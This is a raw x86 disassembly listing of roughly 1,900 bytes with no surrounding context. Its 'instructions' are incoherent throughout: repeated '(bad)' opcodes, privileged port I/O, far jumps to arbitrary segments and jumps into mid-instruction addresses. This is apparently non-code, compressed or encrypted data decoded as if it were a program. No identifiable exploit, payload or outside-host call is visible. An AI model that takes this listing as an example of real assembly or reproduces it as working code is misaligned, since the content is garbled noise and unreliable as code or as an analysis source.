  417d90:	mov    edx,0x2daf1a8a
  417d95:	push   ecx
  417d96:	and    eax,0x7196a9fc
  417d9b:	mov    ecx,0x8922a8e6
  417da0:	repz (bad) 
  417da2:	push   ebp
  417da3:	bound  ecx,QWORD PTR [edi+0x19]
  417da6:	push   es
  417da7:	fpatan 
  417da9:	cs out dx,eax
  417dab:	push   0x18be110a
  417db0:	or     edi,DWORD PTR [ebx+0xa]
  417db3:	test   al,0xfb
  417db5:	jmp    0x500a:0x6bdee2f8
  417dbc:	inc    edi
  417dbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dbe:	inc    edi
  417dbf:	xor    ah,BYTE PTR [edi+0x6a]
  417dc2:	mov    bl,0x64
  417dc4:	jo     0x417e19
  417dc6:	jno    0x417db1
  417dc8:	push   ecx
  417dc9:	pop    es
  417dca:	popa   
  417dcb:	fucom  st(5)
  417dcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dce:	mov    ecx,0xb101465
  417dd3:	mov    esp,DWORD PTR [esi-0x46]
  417dd6:	or     bl,al
  417dd8:	and    ecx,DWORD PTR [ebp-0x40]
  417ddb:	imul   BYTE PTR [ecx-0x5da564cf]
  417de1:	jp     0x417df6
  417de3:	fild   WORD PTR [edx-0xe]
  417de6:	pop    ebx
  417de7:	and    eax,0x68473e70
  417dec:	sbb    al,0xf
  417dee:	addr16 loop 0x417dce
  417df1:	or     eax,0x92be77bd
  417df6:	push   ebx
  417df7:	add    edi,DWORD PTR [ebx-0x2bee48ff]
  417dfd:	stos   DWORD PTR es:[edi],eax
  417dfe:	aad    0xa2
  417e00:	in     al,dx
  417e01:	xchg   edi,eax
  417e02:	push   eax
  417e03:	jo     0x417dae
  417e05:	or     al,0x30
  417e07:	jnp    0x417dcc
  417e09:	mov    dl,0x8a
  417e0b:	das    
  417e0c:	jae    0x417daf
  417e0e:	stos   DWORD PTR es:[edi],eax
  417e0f:	add    DWORD PTR [ecx+0x40],eax
  417e12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e13:	adc    al,0x77
  417e15:	jo     0x417e0d
  417e17:	lods   al,BYTE PTR ds:[esi]
  417e18:	jbe    0x417e5b
  417e1a:	sub    eax,DWORD PTR [edx+eiz*8+0x8]
  417e1e:	sbb    bl,BYTE PTR [eax+eiz*1-0x4359d4d2]
  417e25:	mov    dh,BYTE PTR [esi+0x3]
  417e28:	jmp    0x417e27
  417e2a:	in     eax,dx
  417e2b:	jb     0x417dfb
  417e2d:	fadd   DWORD PTR [eax+edx*4]
  417e30:	mov    eax,ds:0x499455b1
  417e35:	inc    edx
  417e36:	xchg   ebx,eax
  417e37:	sub    DWORD PTR [ecx+0x19],edx
  417e3a:	or     al,0xeb
  417e3c:	ret    0x10e8
  417e3f:	shl    BYTE PTR [eax],cl
  417e41:	mov    bl,0x4f
  417e43:	int3   
  417e44:	sub    DWORD PTR [esi+eiz*2+0x5],eax
  417e48:	data16 sti 
  417e4a:	retf   0x94a9
  417e4d:	push   cs
  417e4e:	add    al,0xfc
  417e50:	xchg   ebp,eax
  417e51:	addr16 dec eax
  417e53:	dec    ecx
  417e54:	repz sbb DWORD PTR [edx+0x1c3dd6b4],edi
  417e5b:	jae    0x417eae
  417e5d:	pusha  
  417e5e:	mov    ?,WORD PTR [ebp-0x5e726bf7]
  417e64:	cmp    DWORD PTR [ebx],0x52dc51fd
  417e6a:	sbb    al,0xea
  417e6c:	ret    
  417e6d:	jp     0x417e11
  417e6f:	imul   ecx,DWORD PTR [edx],0x2e
  417e72:	lds    eax,FWORD PTR [edx-0x684ec98]
  417e78:	push   edx
  417e79:	stos   DWORD PTR es:[edi],eax
  417e7a:	or     al,0x18
  417e7c:	test   DWORD PTR [eax+0x6d],ecx
  417e7f:	not    DWORD PTR [edi]
  417e81:	jnp    0x417e8f
  417e83:	adc    esi,edi
  417e85:	test   eax,0x5d066421
  417e8a:	test   al,0xe3
  417e8c:	loop   0x417e0e
  417e8e:	mov    ds:0xd2635e1f,eax
  417e93:	xchg   ebx,eax
  417e94:	jo     0x417e2e
  417e96:	inc    ecx
  417e97:	sbb    al,0xa9
  417e99:	iret   
  417e9a:	mov    al,ds:0xfdfbb4a2
  417e9f:	mov    eax,ds:0xd1132667
  417ea4:	inc    edx
  417ea5:	xchg   ebx,eax
  417ea6:	nop
  417ea7:	(bad)  
  417ea8:	fisub  WORD PTR [ebx-0x67a77e18]
  417eae:	in     eax,0x47
  417eb0:	(bad)  
  417eb1:	not    DWORD PTR [edx+0x4e0fb8]
  417eb7:	out    dx,al
  417eb8:	xor    eax,0x5de7a164
  417ebd:	lods   eax,DWORD PTR ds:[esi]
  417ebe:	js     0x417f3d
  417ec0:	xchg   BYTE PTR [eax-0x7d],bl
  417ec3:	push   ss
  417ec4:	outs   dx,BYTE PTR ds:[esi]
  417ec5:	xor    eax,0xd915497f
  417eca:	aad    0xa7
  417ecc:	mov    bh,0xcf
  417ece:	push   eax
  417ecf:	out    dx,al
  417ed0:	test   eax,0x52e1a265
  417ed5:	arpl   WORD PTR [eax],cx
  417ed7:	shr    DWORD PTR [eax+0x76a54688],1
  417edd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ede:	xchg   esp,eax
  417edf:	popa   
  417ee0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ee1:	dec    ebp
  417ee2:	popa   
  417ee3:	sar    DWORD PTR [edx+0x5350dd4f],0xd9
  417eea:	xchg   esi,eax
  417eeb:	ret    
  417eec:	les    ebp,FWORD PTR [edi-0x7d]
  417eef:	or     DWORD PTR [ecx-0x2e],edi
  417ef2:	lahf   
  417ef3:	hlt    
  417ef4:	clc    
  417ef5:	call   0x6adc:0x2f437401
  417efc:	(bad)  
  417efd:	xor    esi,esp
  417eff:	jp     0x417f5e
  417f01:	xchg   edx,eax
  417f02:	in     al,dx
  417f03:	sub    BYTE PTR [edi+eiz*1],al
  417f06:	sahf   
  417f07:	add    DWORD PTR [edi+0x69],edx
  417f0a:	xor    eax,0xfb7f3be3
  417f0f:	mov    dl,0x82
  417f11:	aaa    
  417f12:	icebp  
  417f13:	or     al,ch
  417f15:	je     0x417ee1
  417f17:	stc    
  417f18:	add    DWORD PTR [eax+0x6754ebc],ebx
  417f1e:	sahf   
  417f1f:	mov    ebx,ebp
  417f21:	or     eax,DWORD PTR [esi-0x29305a64]
  417f27:	fiadd  DWORD PTR [ebx+edx*4-0x8]
  417f2b:	gs out dx,al
  417f2d:	lahf   
  417f2e:	pop    ecx
  417f2f:	adc    cl,BYTE PTR [ecx+esi*8]
  417f32:	adc    eax,0xc00075c9
  417f37:	or     eax,0xfa225f33
  417f3c:	xchg   edx,eax
  417f3d:	sub    BYTE PTR [eax-0x18],dh
  417f40:	xor    BYTE PTR [ebp+0x51],bl
  417f43:	xor    eax,DWORD PTR [edx-0x6]
  417f46:	sbb    ch,BYTE PTR [edx]
  417f48:	mov    DWORD PTR [edx-0x4],edx
  417f4b:	xchg   BYTE PTR [esi+0x70],bl
  417f4e:	mov    ebp,0xb1c56c0d
  417f53:	mov    eax,fs
  417f55:	jne    0x417eee
  417f57:	sbb    ecx,esi
  417f59:	sub    eax,0x5195d868
  417f5e:	int3   
  417f5f:	fwait
  417f60:	dec    ecx
  417f61:	inc    ebp
  417f62:	ins    BYTE PTR es:[edi],dx
  417f63:	(bad)  
  417f64:	jmp    0xf074:0x3b950d30
  417f6b:	adc    bl,BYTE PTR [ecx]
  417f6d:	pop    esi
  417f6e:	cmc    
  417f6f:	dec    ecx
  417f70:	aad    0x29
  417f72:	and    al,0xfe
  417f74:	and    bh,ah
  417f76:	jae    0x417f2e
  417f78:	cmp    esi,ebx
  417f7a:	adc    BYTE PTR [edx+0x3e],0xae
  417f7e:	and    DWORD PTR [edx],ebp
  417f80:	xor    BYTE PTR [ecx-0x4d],0xea
  417f84:	stos   BYTE PTR es:[edi],al
  417f85:	scas   al,BYTE PTR es:[edi]
  417f86:	dec    ecx
  417f87:	dec    ebp
  417f88:	mov    al,ds:0x7a8c2d22
  417f8d:	xor    ecx,DWORD PTR [eax-0x3d]
  417f90:	and    BYTE PTR [eax+ebp*8],0xef
  417f94:	dec    esi
  417f95:	cwde   
  417f96:	jg     0x417f1a
  417f98:	inc    eax
  417f99:	stc    
  417f9a:	fidiv  WORD PTR [ecx+0x37]
  417f9d:	leave  
  417f9e:	je     0x417f41
  417fa0:	mov    ecx,0xd6cf910
  417fa5:	ror    DWORD PTR [ebp*2+0x194b8352],0x89
  417fad:	jle    0x418018
  417faf:	inc    ebx
  417fb0:	adc    al,0x97
  417fb2:	loope  0x418013
  417fb4:	dec    esp
  417fb5:	xchg   esi,eax
  417fb6:	popf   
  417fb7:	neg    cl
  417fb9:	mov    DWORD PTR [edi+0x2e],ecx
  417fbc:	jmp    0xad59840b
  417fc1:	aaa    
  417fc2:	xor    esp,ebp
  417fc4:	ret    0x9e85
  417fc7:	xchg   esp,eax
  417fc8:	or     al,0xbb
  417fca:	call   0x91b2a44c
  417fcf:	sti    
  417fd0:	test   dl,bh
  417fd2:	jg     0x417f6c
  417fd4:	pop    edx
  417fd5:	rcr    BYTE PTR [ebx-0x75],1
  417fd8:	mov    ebx,0x6c99aa69
  417fdd:	jge    0x417f7a
  417fdf:	sub    al,0x22
  417fe1:	mov    ah,0x29
  417fe3:	popf   
  417fe4:	pop    eax
  417fe5:	xor    ebp,DWORD PTR [edi]
  417fe7:	aaa    
  417fe8:	or     eax,DWORD PTR [edx-0xbf8bd50]
  417fee:	retf   
  417fef:	in     al,dx
  417ff0:	das    
  417ff1:	xchg   edi,eax
  417ff2:	fidiv  DWORD PTR ds:0x78f55542
  417ff8:	xchg   ecx,eax
  417ff9:	daa    
  417ffa:	dec    ebp
  417ffb:	or     eax,0x7a9343ea
  418000:	pop    ebx
  418001:	push   esi
  418002:	sub    al,BYTE PTR [edi]
  418004:	aaa    
  418005:	mul    BYTE PTR [eax-0x4]
  418008:	mov    bh,al
  41800a:	inc    ebp
  41800b:	push   esp
  41800c:	sbb    ebx,DWORD PTR [esp+ebp*8]
  41800f:	aam    0x4b
  418011:	leave  
  418012:	xchg   DWORD PTR [ebx+ebp*1-0x58b6d0e8],ebp
  418019:	mov    al,ds:0x848ff3e6
  41801e:	jbe    0x41808d
  418020:	in     al,dx
  418021:	hlt    
  418022:	push   es
  418023:	retf   0x44b4
  418026:	xchg   ecx,eax
  418027:	ret    0xdba0
  41802a:	mov    BYTE PTR [eax+0x41c79ad3],0x12
  418031:	xchg   esp,eax
  418032:	cmp    al,0xe1
  418034:	imul   ecx,DWORD PTR [esp+edi*4-0x51bffc1],0xf4a207c2
  41803f:	jnp    0x418097
  418041:	lahf   
  418042:	sub    eax,0x8a278517
  418047:	dec    ebp
  418048:	test   BYTE PTR [esi+0x6970c5e6],dh
  41804e:	ret    0x20b6
  418051:	sbb    BYTE PTR [edx],ch
  418053:	xchg   esp,eax
  418054:	mov    bh,0xcb
  418056:	sahf   
  418057:	cs dec edx
  418059:	push   ds
  41805a:	push   ebx
  41805b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41805c:	mov    eax,ds:0x3093215
  418061:	aas    
  418062:	jno    0x4180aa
  418064:	xlat   BYTE PTR ds:[ebx]
  418065:	dec    edi
  418066:	outs   dx,BYTE PTR ds:[esi]
  418067:	into   
  418068:	ror    DWORD PTR [edi],cl
  41806a:	js     0x4180b6
  41806c:	pop    ecx
  41806d:	adc    ecx,ecx
  41806f:	mov    ch,ah
  418071:	pop    edx
  418072:	jecxz  0x418020
  418074:	and    al,0x35
  418076:	div    DWORD PTR ds:[ebx+edx*2]
  41807a:	sub    bh,BYTE PTR [edx+0x4d69d1a1]
  418080:	cmp    eax,0xfab8d3ac
  418085:	push   ss
  418086:	nop
  418087:	mov    BYTE PTR [edx+edi*8],bh
  41808a:	ret    
  41808b:	jecxz  0x418055
  41808d:	add    eax,0xf81b4ac3
  418092:	mov    WORD PTR [eax+0x2e],?
  418095:	lods   al,BYTE PTR ds:[esi]
  418096:	jge    0x418117
  418098:	adc    eax,0x550ffd2
  41809d:	and    edi,DWORD PTR [eax-0x4b]
  4180a0:	lea    esp,[ecx+ebp*1-0x19]
  4180a4:	jb     0x418072
  4180a6:	mov    ebp,0x506179d0
  4180ab:	jns    0x4180c4
  4180ad:	push   ds
  4180ae:	imul   eax,ecx,0x73d7ba30
  4180b4:	jle    0x41805b
  4180b6:	ret    
  4180b7:	ror    BYTE PTR [ecx-0x6d00488a],0xd1
  4180be:	setle  BYTE PTR [esi]
  4180c1:	lods   al,BYTE PTR ds:[esi]
  4180c2:	jbe    0x4180d5
  4180c4:	in     eax,0xe2
  4180c6:	loope  0x41811f
  4180c8:	and    ecx,DWORD PTR [ebx+0x503daeeb]
  4180ce:	cs inc edx
  4180d0:	(bad)  
  4180d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180d4:	and    cl,BYTE PTR [esi-0x47]
  4180d7:	(bad)  
  4180d8:	ins    DWORD PTR es:[edi],dx
  4180d9:	xchg   edi,eax
  4180da:	add    eax,eax
  4180dc:	out    dx,al
  4180dd:	in     al,0x38
  4180df:	repnz aad 0xf5
  4180e2:	(bad)  
  4180e3:	jle    0x4180e5
  4180e5:	loop   0x41810c
  4180e7:	cmc    
  4180e8:	enter  0x5142,0x79
  4180ec:	xor    bh,dl
  4180ee:	dec    edx
  4180ef:	cmp    esi,DWORD PTR [eax]
  4180f1:	lea    esp,[ecx-0x28e8f17e]
  4180f7:	enter  0x9697,0x9d
  4180fb:	dec    ebx
  4180fc:	rcr    DWORD PTR [ebx],cl
  4180fe:	jp     0x4180b8
  418100:	ss mov esi,cs
  418103:	sub    eax,0xcbb20fd
  418108:	cli    
  418109:	out    0xd5,al
  41810b:	inc    eax
  41810c:	xchg   edi,eax
  41810d:	pop    edx
  41810e:	add    al,BYTE PTR [eax+0x2f]
  418111:	dec    eax
  418112:	out    0x4b,eax
  418114:	inc    esp
  418115:	add    DWORD PTR [esi-0x11],ebx
  418118:	mov    cl,BYTE PTR [ebx+0x73]
  41811b:	sbb    dh,BYTE PTR [esi+0x71ba9083]
  418121:	xchg   esp,eax
  418122:	retf   0x65eb
  418125:	lahf   
  418126:	adc    al,0x74
  418128:	(bad)  
  418129:	mov    eax,0xf39ea28b
  41812e:	repz pusha 
  418130:	test   eax,0x6e5aa1a7
  418135:	ss pop edx
  418137:	push   esp
  418138:	or     eax,DWORD PTR [eax-0x2c26fab7]
  41813e:	bnd jo 0x4180f7
  418141:	fbstp  TBYTE PTR [ecx+0x54fa5f3b]
  418147:	inc    ecx
  418148:	jl     0x4181be
  41814a:	clc    
  41814b:	and    eax,0x43ab7794
  418150:	adc    eax,0x93859c35
  418155:	jl     0x4180e0
  418157:	and    DWORD PTR [esi-0x2e],ebp
  41815a:	and    bh,BYTE PTR [esi]
  41815c:	pop    ds
  41815d:	dec    edi
  41815e:	jb     0x418161
  418160:	pop    ebp
  418161:	int3   
  418162:	jecxz  0x4181c1
  418164:	mov    al,0x83
  418166:	inc    esp
  418167:	xor    DWORD PTR [edi-0x114b5b81],edx
  41816d:	sahf   
  41816e:	mov    ebx,0xd75a96f0
  418173:	fild   WORD PTR [eax+ebx*2-0x13]
  418177:	ins    DWORD PTR es:[edi],dx
  418178:	xchg   ebx,eax
  418179:	sub    BYTE PTR [ebx+edx*2-0x3f38a8ab],cl
  418180:	arpl   di,cx
  418182:	(bad)  
  418183:	es aam 0xd8
  418186:	shl    dl,0x5c
  418189:	push   ss
  41818a:	aad    0xd4
  41818c:	aas    
  41818d:	or     DWORD PTR [ecx],eax
  41818f:	xchg   ebp,eax
  418190:	les    esp,FWORD PTR [esi]
  418192:	jne    0x4181d0
  418194:	push   DWORD PTR [ebx-0xd]
  418197:	test   DWORD PTR [edx+0x8],0x30ccf0c9
  41819e:	adc    BYTE PTR [ecx],0xb4
  4181a1:	ja     0x4181c2
  4181a3:	inc    ebx
  4181a4:	mov    cl,0x13
  4181a6:	xor    ebx,DWORD PTR [eax+0x41]
  4181a9:	outs   dx,DWORD PTR ds:[esi]
  4181aa:	cmp    BYTE PTR [ebx-0x75cfb7a5],ch
  4181b0:	(bad)
  4181b5:	xchg   ecx,eax
  4181b6:	push   eax
  4181b7:	lods   al,BYTE PTR ds:[esi]
  4181b8:	(bad)  
  4181b9:	(bad)  
  4181ba:	out    0xcb,al
  4181bc:	jmp    0x4181a1
  4181be:	stos   DWORD PTR es:[edi],eax
  4181bf:	mov    dh,0xf4
  4181c1:	pusha  
  4181c2:	retf   0x674a
  4181c5:	frstor [eax+ebx*2]
  4181c8:	xchg   esp,eax
  4181c9:	jnp    0x418169
  4181cb:	out    0xcf,al
  4181cd:	or     cl,dh
  4181cf:	retf   
  4181d0:	xadd   DWORD PTR [esp+edi*8+0x13],ecx
  4181d5:	sub    DWORD PTR [ecx-0x43f3d98e],esi
  4181db:	fidiv  WORD PTR [ebp-0x16ed9633]
  4181e1:	and    BYTE PTR [eiz*8-0x2d9f997a],ch
  4181e8:	out    dx,al
  4181e9:	add    eax,0xffc4f572
  4181ee:	leave  
  4181ef:	xlat   BYTE PTR ds:[ebx]
  4181f0:	lods   eax,DWORD PTR ds:[esi]
  4181f1:	lea    eax,[esi+0x26]
  4181f4:	push   es
  4181f5:	jne    0x4181f8
  4181f7:	call   0x6fb:0x2cc7cc35
  4181fe:	adc    BYTE PTR [edx-0x6d49e977],cl
  418204:	xchg   DWORD PTR [edx],ebp
  418206:	adc    dh,BYTE PTR [edi]
  418208:	inc    esp
  418209:	pop    ebx
  41820a:	rcl    BYTE PTR [ecx],cl
  41820c:	sar    ch,cl
  41820e:	stos   BYTE PTR es:[edi],al
  41820f:	rcl    BYTE PTR [esi+0xac604a7],cl
  418215:	cmp    esi,DWORD PTR [ecx+0x3c]
  418218:	lods   eax,DWORD PTR ds:[esi]
  418219:	jle    0x41822c
  41821b:	retf   0x3b42
  41821e:	outs   dx,DWORD PTR ds:[esi]
  41821f:	dec    esi
  418220:	mov    cl,0xb4
  418222:	sti    
  418223:	in     al,dx
  418224:	jl     0x418289
  418226:	aad    0x27
  418228:	leave  
  418229:	mov    ax,ds:0x515c4235
  41822f:	push   0xf93b14ac
  418234:	lods   eax,DWORD PTR ds:[esi]
  418235:	mov    BYTE PTR [edi-0x50cdb980],al
  41823b:	(bad)  
  41823d:	jp     0x418260
  41823f:	stos   BYTE PTR es:[edi],al
  418240:	out    0xde,eax
  418242:	cmp    dl,BYTE PTR [edx]
  418244:	cmp    al,0xe
  418246:	sbb    DWORD PTR [edx],edx
  418248:	mov    dl,0x64
  41824a:	lahf   
  41824b:	(bad)  
  41824c:	out    0xe0,al
  41824e:	call   0x40d4:0x886717d6
  418255:	fcmovne st,st(6)
  418257:	mov    cl,0x47
  418259:	jo     0x418200
  41825b:	lods   al,BYTE PTR ds:[esi]
  41825c:	pop    ebx
  41825d:	mov    BYTE PTR [ebp-0x32762288],ah
  418263:	retf   
  418264:	mov    ds,esi
  418266:	mov    gs,esi
  418268:	into   
  418269:	jns    0x418212
  41826b:	adc    al,0xdb
  41826d:	xor    al,0x80
  41826f:	sub    BYTE PTR [ebp+0x20],ah
  418272:	xchg   ecx,eax
  418273:	addr16 push ecx
  418275:	lods   al,BYTE PTR ds:[esi]
  418276:	mov    edi,0xefeaebb2
  41827b:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41827d:	mov    ds:0x971c8e74,eax
  418282:	fs int 0x42
  418285:	push   0xd0a18a43
  41828a:	jmp    0x4e76:0x649cb161
  418291:	(bad)  
  418292:	push   esp
  418293:	mov    dl,0xf3
  418295:	lds    esi,FWORD PTR [ebp+ebp*2-0x214c2c4a]
  41829c:	sbb    ebx,DWORD PTR [edx+0x47a0057e]
  4182a2:	enter  0xf631,0x2e
  4182a6:	in     eax,0xe8
  4182a8:	stos   DWORD PTR es:[edi],eax
  4182a9:	lahf   
  4182aa:	or     dh,dl
  4182ac:	mov    ebx,DWORD PTR [esi]
  4182ae:	xchg   edx,eax
  4182af:	dec    esp
  4182b0:	sub    eax,ebx
  4182b2:	cwde   
  4182b3:	xor    al,0xf9
  4182b5:	aad    0x28
  4182b7:	push   edx
  4182b8:	push   edx
  4182b9:	addr16 pop ecx
  4182bb:	pop    ecx
  4182bc:	inc    esp
  4182bd:	cmp    al,0x16
  4182bf:	out    dx,eax
  4182c0:	fstp   st(7)
  4182c2:	sub    dl,al
  4182c4:	scas   eax,DWORD PTR es:[edi]
  4182c5:	inc    ebx
  4182c6:	pop    ds
  4182c7:	mov    esp,0x285dcb7b
  4182cc:	inc    eax
  4182cd:	rcr    BYTE PTR [esi+0x4d],0x67
  4182d1:	jae    0x4182e1
  4182d3:	in     eax,0xa9
  4182d5:	jge    0x418299
  4182d7:	cli    
  4182d8:	loopne 0x418283
  4182da:	rol    DWORD PTR [edi],1
  4182dc:	mov    esp,0x9638cb8e
  4182e1:	into   
  4182e2:	pop    esp
  4182e3:	shl    DWORD PTR [edx],0x9
  4182e6:	aaa    
  4182e7:	jge    0x418315
  4182e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182ea:	ret    
  4182eb:	fwait
  4182ec:	mov    dl,0xe8
  4182ee:	jmp    0xb70d:0xd3153078
  4182f5:	pop    eax
  4182f6:	call   0x6515:0x883a1588
  4182fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182fe:	add    eax,0x3541bde3
  418303:	in     al,dx
  418304:	dec    ecx
  418305:	sbb    al,BYTE PTR [edx-0x46d1cb88]
  41830b:	gs dec ecx
  41830d:	mov    ds:0xde014f61,eax
  418312:	jb     0x418328
  418314:	loop   0x4182f6
  418316:	push   es
  418317:	mov    ds:0x5cacec81,al
  41831c:	inc    ebp
  41831d:	lods   al,BYTE PTR ds:[esi]
  41831e:	or     dl,dl
  418320:	leave  
  418321:	mov    ebp,DWORD PTR [ebp-0x1a395d63]
  418327:	adc    al,0xae
  418329:	mov    esi,0x2e2e3c8b
  41832e:	lds    esi,FWORD PTR [ebx+eiz*1]
  418331:	xchg   esp,eax
  418332:	arpl   WORD PTR [esi],cx
  418334:	popa   
  418335:	fiadd  WORD PTR [ebx-0xffbfd72]
  41833b:	xchg   DWORD PTR [esi-0x4a],edi
  41833e:	pop    es
  41833f:	xchg   esp,eax
  418340:	stos   BYTE PTR es:[edi],al
  418341:	xor    DWORD PTR [ebx],ebp
  418343:	and    ebp,DWORD PTR [ebp-0x70fdd821]
  418349:	xor    esp,DWORD PTR ds:0xf519e7f6
  41834f:	push   ebx
  418350:	jnp    0x418352
  418352:	mov    ds:0x48848dfe,al
  418357:	ins    BYTE PTR es:[edi],dx
  418358:	mov    edx,0x1e825240
  41835d:	xor    BYTE PTR [ebx+0x3a],cl
  418360:	(bad)  
  418361:	and    al,0xfd
  418363:	xlat   BYTE PTR ds:[ebx]
  418364:	push   ebx
  418365:	jns    0x41834b
  418367:	fwait
  418368:	popf   
  418369:	adc    edx,DWORD PTR [edi-0x42]
  41836c:	and    al,0xbe
  41836e:	test   BYTE PTR [edi],ch
  418370:	jg     0x418398
  418372:	cmp    bl,BYTE PTR [edx+0x2]
  418375:	jmp    0x4183ec
  418377:	jns    0x418365
  418379:	sbb    al,0xe8
  41837b:	enter  0x944d,0x4f
  41837f:	ins    DWORD PTR es:[edi],dx
  418380:	hlt    
  418381:	cli    
  418382:	ins    BYTE PTR es:[edi],dx
  418383:	xor    DWORD PTR [esi],ebp
  418385:	cmp    DWORD PTR [edi+ebp*8],eax
  418388:	ja     0x4183ab
  41838a:	xchg   ebp,eax
  41838b:	sbb    al,0x1
  41838d:	add    cl,ah
  41838f:	mov    ch,0x87
  418391:	daa    
  418392:	mov    ah,0x51
  418394:	or     dl,BYTE PTR [ecx]
  418396:	push   0x70f589ce
  41839b:	stos   DWORD PTR es:[edi],eax
  41839c:	cwde   
  41839d:	xor    al,0xc2
  41839f:	push   edx
  4183a0:	dec    ebx
  4183a1:	xchg   edx,eax
  4183a2:	fs test al,0x12
  4183a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183a6:	pop    ebp
  4183a7:	ins    BYTE PTR es:[edi],dx
  4183a8:	popf   
  4183a9:	das    
  4183aa:	fs in  eax,dx
  4183ac:	jmp    0x7125:0x969d084a
  4183b3:	jno    0x418403
  4183b5:	dec    ebp
  4183b6:	sbb    edx,DWORD PTR [ebp-0x32]
  4183b9:	pop    ss
  4183ba:	frndint 
  4183bc:	xchg   DWORD PTR [edx+0x1],edi
  4183bf:	js     0x418389
  4183c1:	(bad)  
  4183c2:	call   0x1ec3:0xf1c57e67
  4183c9:	sub    BYTE PTR [eax],0xbf
  4183cc:	imul   ebx,DWORD PTR [edi-0x121bf035],0x208cf1f
  4183d6:	pop    ds
  4183d7:	into   
  4183d8:	je     0x41835d
  4183da:	sub    DWORD PTR [edi-0x38],edx
  4183dd:	(bad)  
  4183de:	fucom  st(4)
  4183e0:	pop    ss
  4183e1:	cmp    BYTE PTR [ebx],bh
  4183e3:	push   edx
  4183e4:	dec    esp
  4183e5:	inc    DWORD PTR [ecx-0x5d]
  4183e8:	shl    esi,cl
  4183ea:	mov    ds:0x94e2afb7,eax
  4183ef:	push   ss
  4183f0:	pop    ebx
  4183f1:	out    dx,eax
  4183f2:	bound  esp,QWORD PTR [edi+0x51]
  4183f5:	or     al,0x2
  4183f7:	nop
  4183f8:	inc    ebp
  4183f9:	cs pop edx
  4183fb:	and    eax,0x810b91af
  418400:	xchg   esp,eax
  418401:	repnz lods al,BYTE PTR ds:[esi]
  418403:	imul   esp,DWORD PTR [ebx],0xffffffb9
  418406:	dec    ebx
  418407:	lods   eax,DWORD PTR ds:[esi]
  418408:	and    ecx,DWORD PTR [esi+ebx*8-0x7b]
  41840c:	mov    ah,0xc1
  41840e:	cli    
  41840f:	sbb    al,0xe2
  418411:	jbe    0x4183c6
  418413:	sub    esp,DWORD PTR [edx-0x19]
  418416:	leave  
  418417:	xor    al,0x21
  418419:	dec    edi
  41841a:	jno    0x41845e
  41841c:	repz or ecx,ecx
  41841f:	enter  0x3c3d,0x59
  418423:	xchg   ecx,eax
  418424:	int3   
  418425:	sbb    ebx,DWORD PTR [ebx-0xe4f8a7f]
  41842b:	(bad)  
  41842c:	mov    bh,0x52
  41842e:	aas    
  41842f:	ins    BYTE PTR es:[edi],dx
  418430:	xor    al,0xf0
  418432:	push   ebp
  418433:	lods   eax,DWORD PTR ds:[esi]
  418434:	or     al,0x95
  418436:	aam    0x0
  418438:	ds jne 0x4183c3
  41843b:	pop    ebx
  41843c:	cmp    ch,0x3c
  41843f:	fidivr WORD PTR [edi+0x4d2795b2]
  418445:	(bad)  
  418447:	jecxz  0x418483
  418449:	scas   al,BYTE PTR es:[edi]
  41844a:	arpl   WORD PTR [edi-0x7639c704],dx
  418450:	stos   BYTE PTR es:[edi],al
  418451:	pop    edx
  418452:	mov    ecx,0x62811e86
  418457:	and    BYTE PTR [ebx+ebx*8],bh
  41845a:	mov    ah,0xe6
  41845c:	retf   0xa8f5
  41845f:	xchg   ebx,eax
  418460:	cmp    al,0x5f
  418462:	inc    ebp
  418463:	push   eax
  418464:	cmc    
  418465:	ss xor edx,eax
  418468:	imul   ebp,ecx,0xfffffff0
  41846b:	loope  0x4184ea
  41846d:	cld    
  41846e:	popf   
  41846f:	fbstp  TBYTE PTR [ecx]
  418471:	push   ecx
  418472:	push   esi
  418473:	mov    ds:0x9f590f8c,al
  418478:	lods   al,BYTE PTR ds:[esi]
  418479:	aas    
  41847a:	pop    edx
  41847b:	xchg   DWORD PTR [eax],ecx
  41847d:	outs   dx,DWORD PTR ds:[esi]
  41847e:	popa   
  41847f:	pop    es
  418480:	jns    0x4184f8
  418482:	mov    ebx,0x92599047
  418487:	test   eax,0x7ba6a264
  41848c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41848d:	sub    al,ch
  41848f:	rol    BYTE PTR ds:0xd79a5f90,1
  418495:	pop    es
  418496:	das    
  418497:	cmp    bl,cl
  418499:	test   ah,bl
  41849b:	mov    BYTE PTR [edi+edi*8],ch
  41849e:	mov    eax,ds:0xad410fb0
  4184a3:	sbb    DWORD PTR [ebp-0x7509f1ef],edi
  4184a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184aa:	dec    esp
  4184ab:	std    
  4184ac:	or     DWORD PTR [ebp-0x5a752f69],eax
  4184b2:	inc    eax
  4184b3:	mov    esi,0xf61fa61d
  4184b8:	add    eax,0x1eaea210
  4184bd:	pop    esp
  4184be:	and    al,dh
  4184c0:	mov    eax,0x5f076078
  4184c5:	stos   BYTE PTR es:[edi],al
  4184c6:	and    bh,BYTE PTR [ebp+0x69]
  4184c9:	ins    BYTE PTR es:[edi],dx
  4184ca:	xor    al,0x22
  4184cc:	ret    
  4184cd:	or     BYTE PTR [ecx-0x2bc4dc3f],0xa
  4184d4:	inc    ebp
  4184d5:	sub    DWORD PTR [edx],esp
  4184d7:	ja     0x41852b
  4184d9:	add    DWORD PTR [edi-0x30134a7],edx
  4184df:	outs   dx,BYTE PTR ds:[esi]
  4184e0:	repnz mov esp,0x99d55784
  4184e6:	and    DWORD PTR [ecx],esi
  4184e8:	pop    edi
  4184e9:	cdq    
  4184ea:	sub    BYTE PTR [ebx+ecx*1-0x79],0xe3
  4184ef:	loop   0x41847a
  4184f1:	cwde   
  4184f2:	xchg   esi,eax
  4184f3:	ja     0x4184be
  4184f5:	add    DWORD PTR [edx+eiz*8-0x3b],0x9f79f9ca
  4184fd:	push   0x4c
  4184ff:	sahf   
  418500:	in     al,dx
  418501:	push   cs
  418502:	sub    al,0xf5
